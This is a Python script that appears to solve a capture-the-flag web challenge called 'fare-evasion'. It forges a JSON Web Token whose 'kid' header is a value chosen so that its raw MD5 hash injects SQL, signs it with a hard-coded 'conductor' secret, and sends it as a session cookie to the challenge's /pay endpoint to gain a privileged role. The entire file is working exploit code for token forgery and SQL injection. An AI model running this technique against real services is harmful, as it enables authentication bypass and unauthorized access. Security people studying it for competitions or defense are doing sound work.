import hashlib
import requests
import jwt
import base64


# Define the JWT header and p`ayload
# https://cvk.posthaven.com/sql-injection-with-raw-md5-hashes
md5_hash = "129581926211651571912466741651878684928"
headerKid = md5_hash
header = {
    "alg": "HS256",
    "kid": headerKid,
    "typ": "JWT"
}
print(header)
payload = {
    "type": "conductor",
}

# Secret key for signing
secret_key = "a_boring_passenger_signing_key_?"
secret_key = "conductor_key_873affdf8cc36a592ec790fc62973d55f4bf43b321bf1ccc0514063370356d5cddb4363b4786fd072d36a25e0ab60a78b8df01bd396c7a05cccbbb3733ae3f8e"
# Encode the JWT
token = jwt.encode(payload, secret_key, algorithm="HS256", headers=header)

# Define the headers for the POST request
headers = {
    "Cookie": f"access_token={token}",
    "Sec-Ch-Ua": '"Not/A)Brand";v="8", "Chromium";v="126"',
    "Dnt": "1",
    "Sec-Ch-Ua-Mobile": "?0",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Sec-Ch-Ua-Platform": '"macOS"',
    "Accept": "*/*",
    "Origin": "https://fare-evasion.chal.uiuc.tf",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://fare-evasion.chal.uiuc.tf/",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Priority": "u=1, i"
}

# Define the URL and payload for the POST request
url = "https://fare-evasion.chal.uiuc.tf/pay"
data = {
    # Add any necessary data here
}

# Send the POST request
response = requests.post(url, headers=headers, data=data)

# Print the response
print(response.status_code)
print(response.text)
